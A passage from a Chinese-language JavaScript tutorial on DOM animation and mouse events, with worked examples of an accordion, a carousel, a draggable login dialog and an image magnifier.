  //element---元素
  //json---对象---多个属性及多个目标值
  //fn---函数
  function animate(element,json,fn) {
    clearInterval(element.timeId);
    element.timeId=setInterval(function () {
      var flag=true;//默认,假设,全部到达目标
      for(var attr in json){
        //获取元素这个属性的当前的值
        var current=parseInt(getStyle(element,attr));
        //当前的属性对应的目标值
        var target=json[attr];
        //移动的步数
        var step=(target-current)/10;
        step=step>0?Math.ceil(step):Math.floor(step);
        current+=step;//移动后的值
        element.style[attr]=current+"px";
        if(current!=target){
          flag=false;
        }
      }
      if(flag){
        //清理定时器
        clearInterval(element.timeId);
        //所有的属性到达目标才能使用这个函数,前提是用户传入了这个函数
        if(fn){
          fn();
        }
      }


      //测试代码
      console.log("目标:"+target+",当前:"+current+",每次的移动步数:"+step);
    },20);
  }



  my$("btn1").onclick=function () {

    var json1={"width":400,"height":500,"left":500,"top":80};
      animate(my$("dv"),json1,function () {
        var json2={"width":40,"height":50,"left":50,"top":800};
        animate(my$("dv"),json2,function () {
          var json3={"width":450,"height":550,"left":550,"top":600};
          animate(my$("dv"),json3);
        });
      });
  };

</script>
```
>[danger] #####  登峰造极 -- 增加透明度和层级判断
```
1.单独取出两个属性，增加if 分支判断
```
```
  <style>
    * {
      margin: 0;
      padding: 0;
    }

    div {

      width: 200px;
      height: 100px;
      background-color: green;
      position: absolute;
      left: 0;
      top: 0;
    }

    input {
      z-index: 10;
      position: absolute;
      left: 0;
      top: 0;
    }
  </style>
</head>
<body>
<input type="button" value="移动到400px" id="btn1"/>
<div id="dv">
</div>
<script src="common.js"></script>
<script>
  //点击按钮,改变宽度到达一个目标值,高度到达一个目标值

  //获取任意一个元素的任意一个属性的当前的值---当前属性的位置值
  function getStyle(element, attr) {
    return window.getComputedStyle ? window.getComputedStyle(element, null)[attr] : element.currentStyle[attr] || 0;
  }


  function animate(element, json, fn) {
    clearInterval(element.timeId);//清理定时器
    //定时器,返回的是定时器的id
    element.timeId = setInterval(function () {
      var flag = true;//默认,假设,全部到达目标
      //遍历json对象中的每个属性还有属性对应的目标值
      for (var attr in json) {
        //判断这个属性attr中是不是opacity
        if (attr == "opacity") {
          //获取元素的当前的透明度,当前的透明度放大100倍
          var current = getStyle(element, attr) * 100;
          //目标的透明度放大100倍
          var target = json[attr] * 100;
          var step = (target - current) / 10;
          step = step > 0 ? Math.ceil(step) : Math.floor(step);
          current += step;//移动后的值
          element.style[attr] = current / 100;
        } else if (attr == "zIndex") { //判断这个属性attr中是不是zIndex
          //层级改变就是直接改变这个属性的值
          element.style[attr] = json[attr];
        } else {
          //普通的属性
          //获取元素这个属性的当前的值
          var current = parseInt(getStyle(element, attr));
          //当前的属性对应的目标值
          var target = json[attr];
          //移动的步数
          var step = (target - current) / 10;
          step = step > 0 ? Math.ceil(step) : Math.floor(step);
          current += step;//移动后的值
          element.style[attr] = current + "px";
        }
        //是否到达目标
        if (current != target) {
          flag = false;
        }
      }
      if (flag) {
        //清理定时器
        clearInterval(element.timeId);
        //所有的属性到达目标才能使用这个函数,前提是用户传入了这个函数
        if (fn) {
          fn();
        }
      }
      //测试代码
      console.log("目标:" + target + ",当前:" + current + ",每次的移动步数:" + step);
    }, 20);
  }


  //zIndex:1000
  //透明度: 数字类型----小数---放大100倍
  my$("btn1").onclick = function () {

    var json1 = {"width": 400, "height": 500, "left": 500, "top": 80, "opacity": 0.2};
    animate(my$("dv"), json1, function () {
      animate(my$("dv"), {"width": 40, "height": 50, "left": 0, "top": 0, "opacity": 1, "zIndex": 1000});
    });
  };
```
>[success] # 筋斗云案例
```
1.触发三件事，鼠标移入选择特定位置，样式移动到指定位置
2.鼠标点击记录当前位置
3.鼠标离开回到最后一次被点击位置，也就是记录位置
```
![](https://box.kancloud.cn/08563af4ac2fa517ff654037c4034570_879x100.png)

>[danger] ##### 代码
```
    <style>
        * {
            margin: 0;
            padding: 0
        }

        ul {
            list-style: none
        }

        body {
            background-color: #333;
        }

        .nav {
            width: 800px;
            height: 42px;
            margin: 100px auto;
            background: url(images/rss.png) right center no-repeat;
            background-color: #fff;
            border-radius: 10px;
            position: relative;
        }

        .nav li {
            width: 83px;
            height: 42px;
            text-align: center;
            line-height: 42px;
            float: left;
            cursor: pointer;
        }

        .nav span {
            position: absolute;
            top: 0;
            left: 0;
            width: 83px;
            height: 42px;
            background: url(images/cloud.gif) no-repeat;
        }

        ul {
            position: relative;
        }
    </style>
</head>
<body>
<div class="nav">
    <span id="cloud"></span>
    <ul id="navBar">
        <li>北京校区</li>
        <li>上海校区</li>
        <li>广州校区</li>
        <li>深圳校区</li>
        <li>武汉校区</li>
        <li>关于我们</li>
        <li>联系我们</li>
        <li>招贤纳士</li>
    </ul>
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    //匀速动画
    function animate(element, target) {
        //清理定时器
        clearInterval(element.timeId);
        element.timeId = setInterval(function () {
            //获取元素的当前位置
            var current = element.offsetLeft;
            //移动的步数
            var step = (target - current) / 10;
            step = step > 0 ? Math.ceil(step) : Math.floor(step);
            current += step;
            element.style.left = current + "px";
            if (current == target) {
                //清理定时器
                clearInterval(element.timeId);
            }
            //测试代码:
            console.log("目标位置:" + target + ",当前位置:" + current + ",每次移动步数:" + step);
        }, 20);
    }
    var spanObj = my$('cloud')
    var list =  my$('navBar').children;
    for (var i=0;i<list.length;i++){
        list[i].onmouseover = function () {
            animate(spanObj,this.offsetLeft)
        }
        list[i].onclick = clickHandle;
        list[i].onmouseout = mouseoutHandle;
    }
    //点击的时候,记录此次点击的位置
    var lastPosition = 0;
    function clickHandle() {//点击
        lastPosition = this.offsetLeft;
    }
    function mouseoutHandle() {//离开
        animate(cloud, lastPosition);
    }

</script>
```
>[success] # 手风琴案例代码
```
1.鼠标进入的时候当前的li 宽度变大，其他变小
2.离开后所有的宽度一致的
3.把图片作为li的背景
```
![](https://box.kancloud.cn/b99ed697f0640686809d0f59c8899cd0_1261x423.png)

>[danger] ##### 代码
```
    <style>

        ul {
            list-style: none;
        }

        * {
            margin: 0;
            padding: 0;
        }

        div {
            width: 1150px;
            height: 400px;
            margin: 50px auto;
            border: 1px solid red;
            overflow: hidden;
        }

        div li {
            width: 240px;
            height: 400px;
            float: left;
        }

        div ul {
            width: 1300px;
        }


    </style>
</head>
<body>
<div id="box">
    <ul>
        <li></li>
        <li></li>
        <li></li>
        <li></li>
        <li></li>
    </ul>
</div>
<script src="common.js"></script>
<script>

    //获取任意一个元素的任意一个属性的当前的值---当前属性的位置值
    function getStyle(element, attr) {
        return window.getComputedStyle ? window.getComputedStyle(element, null)[attr] : element.currentStyle[attr] || 0;
    }
    function animate(element, json, fn) {
        clearInterval(element.timeId);//清理定时器
        //定时器,返回的是定时器的id
        element.timeId = setInterval(function () {
            var flag = true;//默认,假设,全部到达目标
            //遍历json对象中的每个属性还有属性对应的目标值
            for (var attr in json) {
                //判断这个属性attr中是不是opacity
                if (attr == "opacity") {
                    //获取元素的当前的透明度,当前的透明度放大100倍
                    var current = getStyle(element, attr) * 100;
                    //目标的透明度放大100倍
                    var target = json[attr] * 100;
                    var step = (target - current) / 10;
                    step = step > 0 ? Math.ceil(step) : Math.floor(step);
                    current += step;//移动后的值
                    element.style[attr] = current / 100;
                } else if (attr == "zIndex") { //判断这个属性attr中是不是zIndex
                    //层级改变就是直接改变这个属性的值
                    element.style[attr] = json[attr];
                } else {
                    //普通的属性
                    //获取元素这个属性的当前的值
                    var current = parseInt(getStyle(element, attr));
                    //当前的属性对应的目标值
                    var target = json[attr];
                    //移动的步数
                    var step = (target - current) / 10;
                    step = step > 0 ? Math.ceil(step) : Math.floor(step);
                    current += step;//移动后的值
                    element.style[attr] = current + "px";
                }
                //是否到达目标
                if (current != target) {
                    flag = false;
                }
            }
            if (flag) {
                //清理定时器
                clearInterval(element.timeId);
                //所有的属性到达目标才能使用这个函数,前提是用户传入了这个函数
                if (fn) {
                    fn();
                }
            }
            //测试代码
            console.log("目标:" + target + ",当前:" + current + ",每次的移动步数:" + step);
        }, 20);
    }

    var list = document.getElementsByTagName('li')
    for(var i=0;i<list.length;i++){
        list[i].style.backgroundImage = "url(images/" + (i + 1) + ".jpg)";
        list[i].onmouseover = mouseoverHandle;
        //鼠标离开
        list[i].onmouseout = mouseoutHandle;
    }
    function mouseoverHandle() {
        for(var j=0;j<list.length;j++){
            animate(list[j], {"width": 100});//动画效果
        }
        animate(this, {"width": 800});
    }

    //离开
    function mouseoutHandle() {
        for (var j = 0; j < list.length; j++) {
            animate(list[j], {"width": 240});//动画效果
        }
    }

</script>
```
 >[success] # 开机动画
 ```
 1.点击按钮触发两个效果
 2.最下面日期的div高度变成0
 3.上面的div 宽度变成0
 4.使用回调函数 ， 进行操作
 ```
 ![](https://box.kancloud.cn/20726715f4fb7e527875c92520876118_652x562.png)
 
 >[danger] ##### 代码
 ```
     <style>
        .box {
            width: 322px;
            position: fixed;
            bottom: 0;
            right: 0;
            overflow: hidden;
        }

        span {
            position: absolute;
            top: 0;
            right: 0;
            width: 30px;
            height: 20px;
            cursor: pointer;
        }
    </style>
</head>
<body>
<div class="box" id="box">
    <span id="closeButton"></span>
    <div class="hd" id="headPart">
        <img src="images/t.jpg" alt=""/>
    </div>
    <div class="bd" id="bottomPart">
        <img src="images/b.jpg" alt=""/>
    </div>
</div>
<script>
    function my$(id) {
        return document.getElementsByTagName(id)
    }

    function animate(element,json,fn) {
        clearInterval(element.timeId);
        element.timeId=setInterval(function () {
            var flag=true;//假设都达到了目标
            for(var attr in json){
                if(attr=="opacity"){//判断属性是不是opacity
                    var current= getAttrValue(element,attr)*100;
                    //每次移动多少步
                    var target=json[attr]*100;//直接赋值给一个变量,后面的代码都不用改
                    var step=(target-current)/10;//(目标-当前)/10
                    step=step>0?Math.ceil(step):Math.floor(step);
                    current=current+step;
                    element.style[attr]=current/100;
                }else if(attr=="zIndex"){//判断属性是不是zIndex
                    element.style[attr]=json[attr];
                }else{//普通的属性

                    //获取当前的位置----getAttrValue(element,attr)获取的是字符串类型
                    var current= parseInt(getAttrValue(element,attr))||0;
                    //每次移动多少步
                    var target=json[attr];//直接赋值给一个变量,后面的代码都不用改
                    var step=(target-current)/10;//(目标-当前)/10
                    step=step>0?Math.ceil(step):Math.floor(step);
                    current=current+step;
                    element.style[attr]=current+"px";
                }
                if(current!=target){
                    flag=false;//如果没到目标结果就为false
                }
            }
            if(flag){//结果为true
                clearInterval(element.timeId);
                if(fn){//如果用户传入了回调的函数
                    fn(); //就直接的调用,
                }
            }
            console.log("target:"+target+"current:"+current+"step:"+step);
        },10);
    }

    //设置最下面的div的高渐渐的变成0
    animate(my$("bottomPart"),{"height":0},function () {
        animate(my$("box"),{"width":0});
    })
    }
</script>
 ```
>[success] # 旋转木马
* 最开始展示的时候图片都层叠在一起
![](https://box.kancloud.cn/411ae463d09341d32dd7cb0dbecc5cbf_825x503.png)
* 页面加载后触发散开效果
![](https://box.kancloud.cn/f23db0098ae649746e48a53ef617b243_1281x641.png)
```

```
>[danger] ##### 旋转木马-- 初期复习数组中的方法
* 删除第一个，追加到最后
```
var arr=[10, 20, 30, 40, 50]
// shift 删除第一个，push 并追加到最后
arr.push(arr.shift())
console.log(arr) //  [20, 30, 40, 50, 10]
```

* 删除最后一个，加到第一个
```
1.第一步让，页面加载完成让图片四散到指定位置
2.鼠标悬停粗来又有点击按钮
3.点击按钮，对配置图片位置的数组，进行删除重新添加操作
4.回调函数是在所有动画效果执行完后才对防止快速点击的锁进行重新赋值
```
* css
```
@charset "UTF-8";
/*初始化  reset*/
blockquote,body,button,dd,dl,dt,fieldset,form,h1,h2,h3,h4,h5,h6,hr,input,legend,li,ol,p,pre,td,textarea,th,ul{margin:0;padding:0}
body,button,input,select,textarea{font:12px/1.5 "Microsoft YaHei", "微软雅黑", SimSun, "宋体", sans-serif;color: #666;}
ol,ul{list-style:none}
a{text-decoration:none}
fieldset,img{border:0;vertical-align:top;}
a,input,button,select,textarea{outline:none;}
a,button{cursor:pointer;}

.wrap{
    width:1200px;
    margin:100px auto;
}
.slide {
    height:500px;
    position: relative;
}
.slide li{
    position: absolute;
    left:200px;
    top:0;
}
.slide li img{
    width:100%;
}
.arrow{
    opacity: 0;
}
.prev,.next{
    width:76px;
    height:112px;
    position: absolute;
    top:50%;
    margin-top:-56px;
    background: url(../images/prev.png) no-repeat;
    z-index: 99;
}
.next{
    right:0;
    background-image: url(../images/next.png);
}

```
* js
```
var arr=[10, 20, 30, 40, 50]
// shift 删除第一个，push 并追加到最后
arr.unshift(arr.pop());
console.log(arr);//[50, 10, 20, 30, 40]
```
>[danger] ##### 代码分析
```
    <link rel="stylesheet" href="css/css(1).css"/>
</head>
<body>
<div class="wrap" id="wrap">
    <div class="slide" id="slide">
        <ul>
            <li><a href="#"><img src="images/slidepic1.jpg" alt=""/></a></li>
            <li><a href="#"><img src="images/slidepic2.jpg" alt=""/></a></li>
            <li><a href="#"><img src="images/slidepic3.jpg" alt=""/></a></li>
            <li><a href="#"><img src="images/slidepic4.jpg" alt=""/></a></li>
            <li><a href="#"><img src="images/slidepic5.jpg" alt=""/></a></li>
        </ul>
        <div class="arrow" id="arrow">
            <a href="javascript:;" class="prev" id="arrLeft"></a>
            <a href="javascript:;" class="next" id="arrRight"></a>
        </div>
    </div>
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }

    function getAttrValue(element,attr) {
        return element.currentStyle?element.currentStyle[attr] : window.getComputedStyle(element,null)[attr]||0;
    }

    function animate(element,json,fn) {
        clearInterval(element.timeId);
        element.timeId=setInterval(function () {
            var flag=true;//假设都达到了目标
            for(var attr in json){
                if(attr=="opacity"){//判断属性是不是opacity
                    var current= getAttrValue(element,attr)*100;
                    //每次移动多少步
                    var target=json[attr]*100;//直接赋值给一个变量,后面的代码都不用改
                    var step=(target-current)/10;//(目标-当前)/10
                    step=step>0?Math.ceil(step):Math.floor(step);
                    current=current+step;
                    element.style[attr]=current/100;
                }else if(attr=="zIndex"){//判断属性是不是zIndex
                    element.style[attr]=json[attr];
                }else{//普通的属性

                    //获取当前的位置----getAttrValue(element,attr)获取的是字符串类型
                    var current= parseInt(getAttrValue(element,attr))||0;
                    //每次移动多少步
                    var target=json[attr];//直接赋值给一个变量,后面的代码都不用改
                    var step=(target-current)/10;//(目标-当前)/10
                    step=step>0?Math.ceil(step):Math.floor(step);
                    current=current+step;
                    element.style[attr]=current+"px";
                }
                if(current!=target){
                    flag=false;//如果没到目标结果就为false
                }
            }
            if(flag){//结果为true
                clearInterval(element.timeId);
                if(fn){//如果用户传入了回调的函数
                    fn(); //就直接的调用,
                }
            }
            console.log("target:"+target+"current:"+current+"step:"+step);
        },10);
    }


    // 定义每个图片的位置
    var config = [
        {
            width: 400,
            top: 20,
            left: 50,
            opacity: 0.2,
            zIndex: 2
        },//0
        {
            width: 600,
            top: 70,
            left: 0,
            opacity: 0.8,
            zIndex: 3
        },//1
        {
            width: 800,
            top: 100,
            left: 200,
            opacity: 1,
            zIndex: 4
        },//2
        {
            width: 600,
            top: 70,
            left: 600,
            opacity: 0.8,
            zIndex: 3
        },//3
        {
            width: 400,
            top: 20,
            left: 750,
            opacity: 0.2,
            zIndex: 2
        }//4

    ];


    var flag=true;//假设所有的动画执行完毕了---锁====================================================

    // 最开始的时候图片是层叠在一起的， 页面加载触发动化函数让图片散开
    var list = my$('slide').children[0].children;
    function assign() {
        // 循环每一个li 标签，让他们定位到指定的位置显示，形成散开的效果
        for(var i=0;i<list.length;i++){
            animate(list[i],config[i],function () {
                flag = true
            })
        }

    }
    // 调用四散效果
    assign();
    //右边按钮,加判断防止快速点击，这样只有执行完动化才能进行下一次
    my$("arrRight").onclick = function () {
        if(flag){//==========================================================
            flag=false;
            // shift 删除第一个，push 并追加到最后
            config.push(config.shift());
            assign();//重新分配
        }

    };
    //左边按钮
    my$("arrLeft").onclick = function () {
        if(flag){//==================================================
            flag=false;
            config.unshift(config.pop());
            assign();
        }

    };

    //鼠标进入,左右焦点的div显示
    my$("slide").onmouseover = function () {
        animate(my$("arrow"), {"opacity": 1});
    };
    //鼠标离开,左右焦点的div隐藏
    my$("slide").onmouseout = function () {
        animate(my$("arrow"), {"opacity": 0});
    };
</script>
```
[TOC]
>[success] # onmousemove -- 初始
```
1.谷歌/火狐 直接使用onmousemove 函数带的参数e.clientX进行移动
2.ie8/谷歌也支持 使用 window.event.clientX
3.注意火狐谷歌带参数e 的直接使用pageX 或者pageY 等同于 可是距离+滚动出去的距离
```

>[danger] ##### 案例分析
![](https://box.kancloud.cn/7ac184e3977be19c41ad12e2ee6142f6_805x951.png)
```
1.clientX 是是区域的移动，图片相对的位置是距离，滚动出去的距离加上可视区域的距离
```

* 获取滚动出去距离的兼容代码
```
function getScroll() {
      return {
        left:window.pageXOffset||document.body.scrollLeft||document.documentElement.scrollLeft||0,
        top:window.pageYOffset||document.body.scrollTop||document.documentElement.scrollTop||0
      }
    }
```
>[danger] ##### 简单代码搭建
```
    <style>
    *{
    margin: 0;
    padding: 0;
    }
    body{
    height: 2000px;
    }
    img{
    position: absolute;
    }
    </style>
</head>
<body>
<img src="images/bird.png" alt="" id="im" />

<script>
    var imgObj = document.getElementById('im')
    document.onmousemove = function (e) {
        // 谷歌火狐支持
        imgObj.style.left = e.clientX + 'px';
        imgObj.style.top = e.clientY + 'px';

        // ie8中的鼠标移动事件方法中没有参数e,这种方法谷歌支持 火狐不支持
        imgObj.style.left = window.event.clientX + 'px'
        imgObj.style.top = window.event.clientY + 'px'
    }
    
function getScroll() {
return {
	left:window.pageXOffset||document.body.scrollLeft||document.documentElement.scrollLeft||0,
	top:window.pageYOffset||document.body.scrollTop||document.documentElement.scrollTop||0
}
}
	//可视区域横坐+向左卷曲出去的横坐标
	my$("im").style.left=window.event.clientX+getScroll().left+"px";
	//可视区域纵坐标+向上卷曲出去的纵坐标
	my$("im").style.top=window.event.clientY+getScroll().top+"px";

};
</script>
```
>[success] # 编写兼容代码
```
1.不兼容的点，ie8中没有函数参数
2.调用可是距离的clientX ，是根据有无函数参数决定的
3.卷曲出去的距离需要兼容
```
>[danger] ##### 代码
```
1.注意火狐谷歌带参数e 的直接使用pageX 或者pageY 等同于 可是距离+滚动出去的距离
```
```
    <style>
    *{
    margin: 0;
    padding: 0;
    }
    body{
    height: 2000px;
    }
    img{
    position: absolute;
    }
    </style>
</head>
<body>
<img src="images/bird.png" alt="" id="im" />

<script>
    //把代码封装在一个函数

    //把代码放在一个对象中
    var evt={
        //window.event和事件参数对象e的兼容
        getEvent:function (evt) {
            return window.event||evt;
        },
        //可视区域的横坐标的兼容代码
        getClientX:function (evt) {
            return this.getEvent(evt).clientX;
        },
        //可视区域的纵坐标的兼容代码
        getClientY:function (evt) {
            return this.getEvent(evt).clientY;
        },
        //页面向左卷曲出去的横坐标
        getScrollLeft:function () {
            return window.pageXOffset||document.body.scrollLeft||document.documentElement.scrollLeft||0;
        },
        //页面向上卷曲出去的纵坐标
        getScrollTop:function () {
            return window.pageYOffset||document.body.scrollTop||document.documentElement.scrollTop||0;
        },
        //相对于页面的横坐标(pageX或者是clientX+scrollLeft)
        getPageX:function (evt) {
            return this.getEvent(evt).pageX? this.getEvent(evt).pageX:this.getClientX(evt)+this.getScrollLeft();
        },
        //相对于页面的纵坐标(pageY或者是clientY+scrollTop)
        getPageY:function (evt) {
            return this.getEvent(evt).pageY?this.getEvent(evt).pageY:this.getClientY(evt)+this.getScrollTop();
        }

    };

    document.onmousemove=function (e) {
        document.getElementById("im").style.left=evt.getPageX(e)+"px";
        document.getElementById("im").style.top=evt.getPageY(e)+"px";
    };
</script>
```
>[success] # 摁住鼠标移动弹窗
```
1.分析鼠标摁住后，在移动位置，所以移动是在摁住触发事件的里面
2.登陆框是跟着鼠标移动，鼠标相对整个document 所以，为doc 绑定移动事件
3.鼠标抬起后清除 移动事件
4.如果移动目标有设置外边距正减，负加
```
```
如下图，当我们获取点击位置到边框固定的距离后，每次移动的距离其实就
是，鼠标坐标 e.clientY 减去固定那个快距离，得到边框距离body距离，然后
我们只要赋值即可重新定义位置
```
![](https://box.kancloud.cn/362bdaa715edb65c4d2df21dfd009351_695x391.png)


>[danger] ##### 简单的弹出对话框案例
```
1.点击任意位置弹窗消失，利用给标签对象赋值定义他的style 
2.return false; / e.preventDefault(); 两个都能阻止默认事件，例如连接跳转
3.window.event.cancelBubble=true; / e.stopPropagation(); 阻止冒泡
```
```
<script>
    function my$(id){
        return document.getElementById(id)
    }

   // 点击超链接弹出登录框,点击页面的任何位置都可以关闭登录框
     my$("link").onclick=function (e) {
       my$("login").style.display="block";
       my$("bg").style.display="block";
       //return false;
       //e.preventDefault();
       //上面的两个是阻止默认事件的,例如连接跳转
       //下面的两个是阻止事件冒泡的
       //window.event.cancelBubble=true;
       e.stopPropagation();
     };
     document.onclick=function () {
       my$("login").style.display="none";
       my$("bg").style.display="none";
       console.log("隐藏了");
     };
</script>
```
>[danger] ##### 完整案例
```
    <style>
        .login-header {
            width: 100%;
            text-align: center;
            height: 30px;
            font-size: 24px;
            line-height: 30px;
        }

        ul, li, ol, dl, dt, dd, div, p, span, h1, h2, h3, h4, h5, h6, a {
            padding: 0px;
            margin: 0px;
        }

        .login {
            width: 512px;
            position: absolute;
            border: #ebebeb solid 1px;
            height: 280px;
            left: 50%;
            right: 50%;
            background: #ffffff;
            box-shadow: 0px 0px 20px #ddd;
            z-index: 9999;
            margin-left: -250px;
            margin-top: 140px;
            display: none;
        }

        .login-title {
            width: 100%;
            margin: 10px 0px 0px 0px;
            text-align: center;
            line-height: 40px;
            height: 40px;
            font-size: 18px;
            position: relative;
            cursor: move;
            -moz-user-select: none; /*火狐*/
            -webkit-user-select: none; /*webkit浏览器*/
            -ms-user-select: none; /*IE10*/
            -khtml-user-select: none; /*早期浏览器*/
            user-select: none;
        }

        .login-input-content {
            margin-top: 20px;
        }

        .login-button {
            width: 50%;
            margin: 30px auto 0px auto;
            line-height: 40px;
            font-size: 14px;
            border: #ebebeb 1px solid;
            text-align: center;
        }

        .login-bg {
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0px;
            left: 0px;
            background: #000000;
            filter: alpha(opacity=30);
            -moz-opacity: 0.3;
            -khtml-opacity: 0.3;
            opacity: 0.3;
            display: none;
        }

        a {
            text-decoration: none;
            color: #000000;
        }

        .login-button a {
            display: block;
        }

        .login-input input.list-input {
            float: left;
            line-height: 35px;
            height: 35px;
            width: 350px;
            border: #ebebeb 1px solid;
            text-indent: 5px;
        }

        .login-input {
            overflow: hidden;
            margin: 0px 0px 20px 0px;
        }

        .login-input label {
            float: left;
            width: 90px;
            padding-right: 10px;
            text-align: right;
            line-height: 35px;
            height: 35px;
            font-size: 14px;
        }

        .login-title span {
            position: absolute;
            font-size: 12px;
            right: -20px;
            top: -30px;
            background: #ffffff;
            border: #ebebeb solid 1px;
            width: 40px;
            height: 40px;
            border-radius: 20px;
        }


    </style>
</head>
<body>
    <div class="login-header">
        <a id="link" href="javascript:void(0);">点击登录</a>
    </div>
    <div id="login" class="login">
        <div id="title" class="login-title">登录会员
            <span><a id="closeBtn" href="javascript:void(0);" class="close-login">关闭</a></span></div>
        <div class="login-input-content">
            <div class="login-input">
                <label>用户名：</label>
                <input type="text" placeholder="请输入用户名" name="info[username]" id="username" class="list-input">
            </div>
            <div class="login-input">
                <label>登录密码：</label>
                <input type="password" placeholder="请输入登录密码" name="info[password]" id="password" class="list-input">
            </div>
        </div>
        <div id="loginBtn" class="login-button"><a href="javascript:void(0);" id="login-button-submit">登录会员</a></div>
    </div><!--登录框-->
    <div id="bg" class="login-bg"></div><!--遮挡层-->
</body>
<script>
    function my$(id){
        return document.getElementById(id)
    }
    //获取超链接,注册点击事件,显示登录框和遮挡层
    my$("link").onclick = function () {
        my$("login").style.display = "block";
        my$("bg").style.display = "block";
    };

    //获取关闭,注册点击事件,隐藏登录框和遮挡层
    my$("closeBtn").onclick = function () {
        my$("login").style.display = "none";
        my$("bg").style.display = "none";
    };
    // 鼠标摁下后紧接着出现 移动事件
    my$('title').onmousedown = function (e) {
        var spaceX = e.clientX - my$("login").offsetLeft;
        var spaceY = e.clientY - my$("login").offsetTop;
        // 可移动的范围是整个document 页面
        document.onmousemove = function (e) {
            // 鼠标停留位置的对象如果设置了margin 值也会对鼠标位置有影响，所以正减负加
            var x = e.clientX - spaceX+250;
            var y = e.clientY - spaceY-140;
            my$("login").style.left = x + "px";
            my$("login").style.top = y + "px";
        }
    }
    document.onmouseup=function () {
        document.onmousemove=null;//当鼠标抬起的时候,把鼠标移动事件干掉
    };
</script>
```
[TOC]
>[success] # 用回调思想处理异步
```
1.异步在不确定的时间点出发函数内部，所以思路就是在内部就处理，异步，让参数成为异步函数的内部
2.常见的几种异步 setTimeout readFile writeFile ajax
```
>[danger] ##### 小的案例处理setTimeout函数
```
//处理异步的时候，当异步触发内部函数时在触发整体
function fn(callback) {
    setTimeout(function () {
        var num =1
        callback(num)
    },1000)
}

var a = fn(function (data) {
    console.log(1)

})
```
>[success] # 用回调函数做条件判断
```
1.例如EcmaScript6 中的find 方法
```
>[danger] ##### 仿写一个find 方法讲解
```
1.if中的conditionFunc函数用来做if条件的，如果为真就返回指定内容，并且接受
```
```
var users = [
  {id: 1, name: '张三'},
  {id: 2, name: '张三'},
  {id: 3, name: '张三'},
  {id: 4, name: '张三'}
]

Array.prototype.myFind = function (conditionFunc) {
  // var conditionFunc = function (item, index) { return item.id === 4 }
  for (var i = 0; i < this.length; i++) {
    if (conditionFunc(this[i], i)) {
      return this[i]
    }
  }
}

var ret = users.myFind(function (item, index) {
  return item.id === 2
})
```
>[success] # 模拟购物图片放大镜效果

>[danger] ##### css 代码效果

* 最开始布局效果
![](https://box.kancloud.cn/aa4ea11d65df6cc9fee8e1b055dff528_1518x690.png)
* 给大图片设置容器然后 溢出隐藏
![](https://box.kancloud.cn/5c49de9e785b2197f0caf85c4b374e4b_1200x640.png)
* 最后效果 初始化的时候全部隐藏只留下展示照片
![](https://box.kancloud.cn/c39c1d38e50efb3e7e74c4bd05de23dc_984x675.png)
```
    <style>
        * {
            margin: 0;
            padding: 0;
        }

        .box {
            width: 350px;
            height: 350px;
            margin: 100px;
            border: 1px solid #ccc;
            position: relative;
        }

        .big {
            width: 400px;
            height: 400px;
            position: absolute;
            top: 0;
            left: 360px;
            border: 1px solid #ccc;
            overflow: hidden;
            display: none;
        }

        .mask {
            width: 175px;
            height: 175px;
            background: rgba(255, 255, 0, 0.4);
            position: absolute;
            top: 0px;
            left: 0px;
            cursor: move;
            display: none;
        }

        .small {
            position: relative;
        }
    </style>
</head>
<body>
<div class="box" id="box">
    <div class="small"><!--小层-->
        <img src="images/small.png" width="350" alt=""/>
        <div class="mask"></div><!--遮挡层-->
    </div><!--小图-->
    <div class="big"><!--大层-->
        <img src="images/big.jpg" width="800" alt=""/><!--大图-->
    </div><!--大图-->
</div>
</body>
```

>[dagner] ##### 完整代码
```
1.首先 我们是相对小图片移动，所以小图片左上的点事0,0，由于设置了margin，我们想让鼠标停留在遮挡层中间，所以做了处理
2.设置左上最小移动距离当前中心点在遮挡层中间，遮挡层和小图片是子绝父相的关
 系，最大值也同理
3.大图片其实可以看成 一个固定打的遮挡层和大图片，但是是大图片移动不是遮挡层
 移动，根据比例显示大图片展示效果
```
```
    <style>
        * {
            margin: 0;
            padding: 0;
        }

        .box {
            width: 350px;
            height: 350px;
            margin: 100px;
            border: 1px solid #ccc;
            position: relative;
        }

        .big {
            width: 400px;
            height: 400px;
            position: absolute;
            top: 0;
            left: 360px;
            border: 1px solid #ccc;
            overflow: hidden;
            display: none;
        }

        .mask {
            width: 175px;
            height: 175px;
            background: rgba(255, 255, 0, 0.4);
            position: absolute;
            top: 0px;
            left: 0px;
            cursor: move;
            display: none;
        }

        .small {
            position: relative;
        }
    </style>
</head>
<body>
<div class="box" id="box">
    <div class="small"><!--小层-->
        <img src="images/small.png" width="350" alt=""/>
        <div class="mask"></div><!--遮挡层-->
    </div><!--小图-->
    <div class="big"><!--大层-->
        <img src="images/big.jpg" width="800" alt=""/><!--大图-->
    </div><!--大图-->
</div>
<script>
    // 获取每个元素例如 小图div / 遮挡层/ 大图div / 大图图片
    function my$(id){
        return document.getElementById(id)
    }
    // 获取 最外层 box
    var box = my$('box');
    // 获取小图div
    var small = box.children[0];
    // 获取 遮挡层
    var mask = small.children[1];
    // 获取大图div
    var big = box.children[1];
    //获取大图
    var bigImg = big.children[0];

    // 鼠标进进入 去掉遮罩层 和 大图片的显示
    box.onmouseover =function () {
        mask.style.display = 'block'
        big.style.display = 'block'
    }

    // 鼠标离开隐藏
    box.onmouseout =function () {
        mask.style.display = 'none'
        big.style.display = 'none'
    }

    // 给放 小照片div 绑定移动事件
    small.onmousemove = function (e) {
        // 将光标固定在遮罩层 中间
        // 用鼠标距离 dom 的可是距离 - 遮罩层边框距离 中心 距离 == 遮罩层中间到边框距离
        var x = e.clientX - mask.offsetWidth / 2;
        var y = e.clientY - mask.offsetHeight / 2;
        // 扣除去 遮罩层 margin 影响
        x = x - 100;
        y = y - 100;
        // 设置可移动距离 当中心点移出图片距离的时候 设置横纵坐标最小距离
        x = x < 0 ? 0 : x;
        //纵坐标的最小值
        y = y < 0 ? 0 : y;

        //横坐标的最大值
        x = x > small.offsetWidth - mask.offsetWidth ? small.offsetWidth - mask.offsetWidth : x;
        //纵坐标的最大值
        y = y > small.offsetHeight - mask.offsetHeight ? small.offsetHeight - mask.offsetHeight : y

        mask.style.left = x + 'px'
        mask.style.top = y + 'px'

        //遮挡层的移动距离/大图的移动距离=遮挡层的最大移动距离/大图的最大移动距离
        //大图的移动距离=遮挡层的移动距离*大图的最大移动距离/遮挡层的最大移动距离

        //大图的横向的最大移动距离
